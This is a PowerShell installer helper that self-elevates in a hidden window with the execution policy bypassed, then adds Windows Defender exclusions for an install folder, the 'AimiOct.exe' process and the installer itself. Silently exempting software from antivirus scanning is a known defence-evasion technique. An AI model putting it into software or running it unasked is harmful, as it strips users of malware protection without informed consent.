param(
    [Parameter(Mandatory = $true)]
    [string]$InstallDir,
    [string]$InstallerPath = ""
)

$ErrorActionPreference = "Stop"

function Add-OctopExclusions {
    New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
    Add-MpPreference -ExclusionPath $InstallDir
    Add-MpPreference -ExclusionProcess "AimiOct.exe"
    if ($InstallerPath) {
        Add-MpPreference -ExclusionPath $InstallerPath
        $leaf = Split-Path -Leaf $InstallerPath
        if ($leaf) {
            Add-MpPreference -ExclusionProcess $leaf
        }
    }
}

$principal = New-Object Security.Principal.WindowsPrincipal(
    [Security.Principal.WindowsIdentity]::GetCurrent()
)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $argList = @(
        "-NoProfile",
        "-WindowStyle", "Hidden",
        "-ExecutionPolicy", "Bypass",
        "-File", $PSCommandPath,
        "-InstallDir", $InstallDir
    )
    if ($InstallerPath) {
        $argList += @("-InstallerPath", $InstallerPath)
    }
    $p = Start-Process -FilePath "powershell.exe" -Verb RunAs -Wait -PassThru -WindowStyle Hidden -ArgumentList $argList
    exit $(if ($p) { $p.ExitCode } else { 1 })
}

Add-OctopExclusions
